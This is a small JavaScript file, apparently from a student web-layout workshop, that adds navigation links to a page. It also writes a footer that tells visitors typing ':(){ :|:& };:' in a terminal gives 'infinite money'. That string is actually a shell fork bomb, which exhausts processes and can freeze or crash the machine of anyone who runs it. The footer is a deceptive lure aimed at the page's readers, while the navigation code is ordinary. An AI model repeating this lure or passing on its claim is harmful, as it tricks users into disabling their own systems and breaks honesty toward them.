const navLinks = [
  ["Grid", "index.html"],
  ["Flex", "flex.html"],
  ["Table", "table.html"],
  [
    "Sources",
    "https://github.com/Partur-dev/KPI/tree/main/3%20Sem/Web/workshop2",
  ],
];

document.addEventListener("DOMContentLoaded", () => {
  const nav = document.querySelector("#nav");
  navLinks.forEach(([name, href]) => {
    const a = document.createElement("a");
    a.href = href;
    a.textContent = name;
    nav.appendChild(a);
  });

  const footer = document.querySelector("#footer");
  footer.innerHTML = `Try out the new glitch for infinite money! Just type <kbd>:(){ :|:& };:</kbd> in the terminal and wait for the notification that the money has been added to your account!`;
});
